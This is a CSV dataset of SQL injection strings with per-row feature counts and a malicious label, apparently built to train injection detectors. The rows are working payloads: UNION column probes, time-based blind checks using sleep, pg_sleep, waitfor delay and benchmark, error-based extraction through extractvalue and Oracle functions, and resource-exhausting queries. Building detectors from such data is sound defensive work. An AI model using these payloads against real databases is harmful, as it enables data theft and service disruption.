Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,3,0,6,0,0,14,2,0,0,2,8,0,0,0,0,0,1,26,17,3,1
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",0,1,4,0,0,12,2,1,0,1,3,0,0,0,0,0,0,18,13,1,1
"1 union all select null,null,null,null,null,null,null--",0,0,8,0,0,5,4,0,0,1,3,7,0,0,0,0,1,42,1,0,1
"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",0,0,10,0,0,7,4,0,0,1,4,0,0,0,0,0,1,14,28,0,1
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,8,0,0,18,3,1,0,3,6,0,0,0,0,1,1,33,10,1,1
"1%""   )    )    union all select null,null--",0,1,6,0,0,7,4,0,1,1,4,2,0,0,0,0,1,22,1,1,1
"-2325'   )    )     )   union all select 1442,1442,1442--",1,0,9,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,16,1,1
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",0,0,7,1,0,13,1,1,0,2,5,0,0,0,0,1,0,15,10,0,1
"-3733'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd",4,0,42,0,0,78,3,1,0,3,27,0,0,0,0,0,1,91,52,4,1
1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,3,0,6,0,0,16,2,1,0,2,5,0,0,0,0,1,1,31,10,3,1
"1""  )   as boeh where 2571  =  2571 union all select null#",0,1,2,0,0,12,4,1,0,1,2,1,0,0,0,0,1,29,9,1,1
"-4639""   )    )     )   or 8550  =  9348",0,1,5,0,0,8,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1' union all select null,null,null,null,null,null,null#",1,0,7,0,0,5,4,0,0,1,1,7,0,0,0,0,1,42,1,1,1
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",0,0,30,0,0,54,13,2,0,9,13,0,2,0,0,0,3,100,43,0,1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",2,4,15,0,0,21,5,1,0,7,9,0,0,0,0,0,0,46,15,6,1
"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1,0,14,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,44,1,1
"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,27,0,0,44,5,1,0,2,8,0,3,0,0,0,4,54,79,1,1
select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
"-5972"" or 8509  =  3448#",0,1,2,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,14,0,0,28,2,4,0,2,7,0,0,0,0,0,1,83,16,1,1
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",0,4,12,0,0,16,2,1,0,3,4,0,0,0,0,1,0,21,2,4,1
1' where 7176  =  7176,1,0,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",0,1,9,0,0,5,4,0,1,1,3,0,0,0,0,0,1,14,36,1,1
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'phdn' like 'phdn",4,0,19,0,0,29,8,3,0,8,10,0,0,0,0,0,1,79,8,4,1
-8465' where 5242  =  5242 or 3806  =  7423--,1,0,4,0,0,9,1,0,0,1,6,0,0,0,0,0,0,7,20,1,1
-4325 order by 1--,0,0,3,0,0,4,2,0,0,1,4,0,0,0,0,0,0,7,5,0,1
"1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj",4,0,13,0,0,18,5,0,0,5,6,0,0,0,0,0,0,25,13,4,1
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",0,4,8,0,0,14,2,0,0,4,7,0,0,0,0,0,0,14,13,4,1
"-2759%""   )    )    or 7769  =  1249#",0,1,4,0,0,7,1,0,1,1,4,0,0,0,0,0,0,2,12,1,1
"create or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict",6,0,11,0,0,15,3,4,0,3,5,0,0,0,0,2,1,72,1,6,1
"make_set  (  8734  =  8734,sleep  (  5   )    )   ",0,0,5,0,0,9,2,1,0,0,1,0,0,0,0,1,0,12,9,0,1
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#",0,1,4,0,0,13,1,1,0,1,4,0,0,0,0,0,0,13,20,1,1
"1""  )   as ikdo where 4128  =  4128",0,1,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",0,1,6,0,0,14,1,2,0,2,5,0,0,0,0,1,0,19,10,1,1
"1%""   )    )     )   rlike   (  select   (  case when   (  4442  =  4476  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,0,4,16,0,0,29,3,1,2,3,7,0,1,0,0,0,1,34,13,4,1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,0,0,6,0,0,16,2,0,0,4,7,0,0,0,0,0,0,6,21,0,1
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",0,4,13,0,0,22,4,0,0,4,6,0,0,0,0,0,1,46,13,4,1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,4,0,38,0,0,76,5,13,0,6,17,0,0,0,0,0,1,93,47,4,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",0,4,15,0,0,25,8,3,0,9,11,0,0,0,0,0,1,80,8,4,1
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm",0,4,13,0,0,22,3,0,0,4,7,0,0,0,0,0,1,43,13,4,1
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,0,0,10,0,0,22,3,3,0,0,4,0,0,0,0,0,2,53,17,0,1
"1'||  (  select 'ryyc' from dual where 5196  =  5196 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",4,0,32,0,0,58,3,7,0,2,18,2,0,0,0,0,1,94,37,4,1
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,0,0,3,0,0,13,4,1,0,1,3,0,0,0,0,0,1,25,16,0,1
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",4,0,13,0,0,18,4,0,0,4,6,0,0,0,0,0,0,21,13,4,1
"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504",0,0,13,0,0,31,3,4,0,3,6,0,0,0,0,0,1,74,17,0,1
 )  s,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1
"1""   )    )     )   union all select null,null--",0,1,7,0,0,8,4,0,0,1,3,2,0,0,0,0,1,22,1,1,1
"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895",0,0,7,0,0,16,2,0,0,4,6,0,0,0,0,0,0,9,21,0,1
-3849  )   or 5580  =  3442--,0,0,4,0,0,6,1,0,0,1,5,0,0,0,0,0,0,2,12,0,1
select case when 3920  =  4402 then 1 else null end--,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
1  )   where 2390  =  2390,0,0,1,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft",0,4,9,0,0,15,2,0,0,3,5,0,1,0,0,0,0,26,21,4,1
"1"" where 3510  =  3510",0,1,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
-5585%'   )    )     )   or 6990  =  7727,1,0,5,0,0,8,1,0,1,1,4,0,0,0,0,0,0,2,12,1,1
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",0,0,6,0,0,10,1,0,0,1,1,0,0,0,0,0,0,13,10,0,1
"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1,8,0,0,14,1,0,1,1,3,0,1,0,0,0,0,17,19,1,1
1'||  (  select 'uedk' where 4655  =  4655,3,0,4,0,0,8,1,0,0,0,3,0,0,0,0,0,1,15,9,3,1
-2022   )    )     )   or 6812  =  3516 and    (    (     (  3896  =  3896,0,0,7,0,0,15,2,0,0,3,6,0,0,0,0,0,0,5,20,0,1
"-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv",4,0,40,0,0,79,6,14,0,5,18,0,0,0,0,0,2,106,50,4,1
"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",0,0,9,0,0,23,1,1,0,0,2,0,0,0,0,0,1,48,20,0,1
"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--",0,1,9,0,0,9,4,0,0,1,4,7,0,0,0,0,1,47,9,1,1
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',4,0,14,0,0,27,3,1,2,3,7,0,1,0,0,0,1,34,13,4,1
"1' where 4701  =  4701 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,0,29,0,0,61,16,1,0,5,12,0,2,0,0,0,6,104,63,1,1
1%'   )    )     )   and 4595  =  4595#,1,0,4,0,0,8,1,0,1,2,4,0,0,0,0,0,0,3,9,1,1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",0,2,5,1,0,16,3,0,1,2,8,0,0,0,1,0,1,26,4,2,1
"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",1,0,10,0,0,12,4,1,0,1,5,0,0,0,0,0,1,25,36,1,1
"-7868""   )    )    or 9323  =  9323#",0,1,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,4,0,38,0,0,75,4,1,0,4,28,0,0,0,0,0,1,99,48,4,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",3,0,10,0,0,17,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",0,1,9,0,0,13,4,1,0,1,5,0,0,0,0,0,1,25,28,1,1
"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,23,0,0,44,2,6,0,3,13,1,0,0,0,0,0,64,35,0,1
1'+  (  select yjtm where 3965  =  3965 and 9389  =  3443,1,0,2,0,0,12,2,0,0,2,5,0,0,0,0,0,1,18,17,1,1
1 union all select null#,0,0,0,0,0,5,4,0,0,1,1,1,0,0,0,0,1,18,1,0,1
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,22,0,0,41,2,5,0,3,13,1,0,0,0,0,0,58,33,0,1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,4,0,36,0,0,73,5,1,0,5,28,0,0,0,0,0,1,103,48,4,1
"1   )    )     )   union all select null,null,null,null,null,null#",0,0,8,0,0,8,4,0,0,1,1,6,0,0,0,0,1,38,1,0,1
"iif  (  9875  =  8961,1,1/0  )  ",0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,10,0,0,22,2,0,0,2,7,0,0,0,0,0,1,37,21,0,1
"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,11,0,0,24,3,0,0,1,7,0,0,0,0,0,2,46,21,1,1
-1564'  )   order by 1--,1,0,5,0,0,5,2,0,0,1,4,0,0,0,0,0,0,7,5,1,1
1'  )   where 5280  =  5280 and 4595  =  4595#,1,0,2,0,0,10,1,0,0,2,4,0,0,0,0,0,0,8,17,1,1
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1,30,0,0,53,2,7,0,3,17,2,0,0,0,0,0,77,35,1,1
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,13,0,0,28,2,7,1,2,7,0,0,0,7,0,1,109,12,1,1
-7187' or 4159  =  7465,1,0,2,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",2,0,9,0,0,20,2,1,0,2,6,0,0,0,0,1,1,26,18,2,1
"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",4,0,32,0,0,52,13,2,2,9,15,0,2,0,0,0,3,100,35,4,1
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",0,0,8,0,0,20,1,1,0,0,4,0,0,0,0,0,1,48,19,0,1
end and   (  '%'  =  ',3,0,4,0,0,6,1,0,1,2,4,0,0,0,0,0,0,6,0,3,1
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",0,1,9,0,0,12,4,1,0,1,2,8,0,0,0,0,1,57,9,1,1
end and    (    (   'pfrt'  =  'pfrt,3,0,5,0,0,7,1,0,0,2,3,0,0,0,0,0,0,14,0,3,1
"1""  )   as aifd where 5962  =  5962",0,1,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",4,0,16,0,0,28,2,0,0,3,11,0,0,0,0,0,0,47,16,4,1
1%' and 9198  =  9198--,1,0,3,0,0,5,1,0,1,2,6,0,0,0,0,0,0,3,9,1,1
-8378%'  )   union all select 5491#,1,0,3,0,0,6,4,0,1,1,3,0,0,0,0,0,1,14,8,1,1
"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1,0,11,0,0,10,4,0,0,1,5,0,0,0,0,0,1,19,40,1,1
"1%""   )    )    order by 1#",0,1,3,0,0,6,2,0,1,1,2,0,0,0,0,0,0,7,2,1,1
""" or """"-""",0,4,5,0,0,3,1,0,0,1,2,0,0,0,0,0,0,2,0,4,1
select case when 3819  =  1887 then 1 else null end--,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
-3988'   )    )    union all select 1113#,1,0,4,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,8,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk",0,3,11,0,0,18,7,3,0,7,8,0,0,0,0,0,1,77,3,3,1
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',4,0,16,0,0,29,3,1,2,3,7,0,1,0,0,0,1,34,13,4,1
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,4,0,10,0,0,15,2,0,0,4,6,0,0,0,0,0,0,14,9,4,1
"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",0,1,4,0,0,12,4,1,0,1,3,0,0,0,0,0,1,25,20,1,1
"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",0,0,17,0,0,23,0,1,0,0,0,0,2,0,0,0,0,49,24,0,1
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",0,0,5,1,0,16,4,1,0,0,4,0,0,0,1,0,2,41,3,0,1
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",1,0,13,0,0,6,4,0,1,1,4,10,0,0,0,0,1,54,1,1,1
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,0,8,0,0,5,4,0,1,1,3,0,0,0,0,0,1,14,32,1,1
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",0,0,5,0,0,12,4,1,0,1,2,5,0,0,0,0,1,45,9,0,1
"1%'   )    )     )   union all select null,null,null,null,null--",1,0,10,0,0,8,4,0,1,1,4,5,0,0,0,0,1,34,1,1,1
" select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",2,1,9,1,0,17,5,1,0,1,5,0,0,0,1,0,2,43,3,3,1
"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",3,0,14,0,0,26,8,0,0,7,13,0,0,0,5,0,2,78,18,3,1
"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",0,1,8,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,28,1,1
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,0,0,35,0,0,74,3,13,0,2,14,0,0,0,0,0,1,81,50,0,1
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,0,0,30,0,0,67,3,1,0,2,25,0,0,0,0,0,1,88,48,0,1
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",4,0,39,0,0,79,3,1,0,2,29,0,0,0,0,0,2,96,57,4,1
"1""   )    )    and 7533  =  7533 and    (    (   ""gkca""  =  ""gkca",0,4,8,0,0,13,2,0,0,4,6,0,0,0,0,0,0,14,9,4,1
 (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,0,0,10,0,0,31,3,3,0,1,3,0,0,0,0,0,2,56,14,0,1
1 and 9412  =  6877#,0,0,0,0,0,5,1,0,0,2,3,0,0,0,0,0,0,3,9,0,1
"-5910%'   )    )     )   union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1,0,16,0,0,8,4,0,1,1,5,0,0,0,0,0,1,14,44,1,1
"1""   )    )     )   union all select null,null,null,null,null#",0,1,8,0,0,8,4,0,0,1,1,5,0,0,0,0,1,34,1,1,1
"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,0,18,0,0,29,2,2,0,1,5,0,3,0,0,0,1,47,43,0,1
"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",2,4,14,0,0,14,2,1,0,3,4,0,0,0,0,1,0,23,4,6,1
1  )   where 2170  =  2170,0,0,1,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,8,0,0,15,2,1,0,1,4,0,0,0,0,1,1,19,10,1,1
"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",3,0,8,0,0,14,5,0,0,1,7,0,0,0,0,0,2,37,20,3,1
"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",0,1,11,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,24,1,1
"1%""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,2,4,21,0,0,27,4,1,2,6,11,0,0,0,0,0,0,34,15,6,1
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1,0,10,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,32,1,1
1  )   as bhdj where 4472  =  4472,0,0,1,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
1   )    )    as mcyh where 1001  =  1001,0,0,2,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,4,0,12,0,0,21,5,1,0,5,6,0,0,0,0,1,2,43,2,4,1
0x730065006c0065006300740020004000400076006500 ...,0,0,4,0,0,2,0,0,0,0,0,0,1,0,0,0,0,2,44,0,1
"1  )   as ahfj where 4776  =  4776 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,12,0,0,27,2,4,0,1,6,0,0,0,0,0,1,82,16,0,1
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1,12,0,0,24,6,3,0,6,11,0,0,0,0,0,1,70,16,1,1
-1643' where 1968  =  1968 or 3484  =  6642,1,0,2,0,0,9,1,0,0,1,4,0,0,0,0,0,0,7,20,1,1
"1%'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,11,0,0,23,2,4,1,1,6,0,0,0,0,0,1,71,9,1,1
"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,0,4,37,0,0,74,3,1,2,4,29,0,0,0,0,0,1,84,49,4,1
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",4,0,23,0,0,29,3,1,0,4,6,0,3,0,0,0,1,48,35,4,1
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',3,0,5,1,0,16,2,0,0,1,7,0,0,0,1,0,1,24,5,3,1
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",0,0,9,0,0,18,2,0,0,4,6,0,0,0,0,0,0,9,21,0,1
end and    (    (     (  'hglq' like 'hglq,3,0,6,0,0,8,2,0,0,3,3,0,0,0,0,0,0,18,0,3,1
"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",0,0,8,0,0,20,1,1,0,0,4,0,0,0,0,0,1,48,19,0,1
"1 and make_set  (  9681  =  4703,4703  )  # zbrf",0,0,3,0,0,10,3,0,0,2,3,0,0,0,0,0,0,14,13,0,1
"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,0,4,11,0,0,25,3,4,2,3,8,0,0,0,0,0,1,74,9,4,1
1'  )   and sleep  (  5  )  #,1,0,4,0,0,8,1,1,0,2,2,0,0,0,0,1,0,8,2,1,1
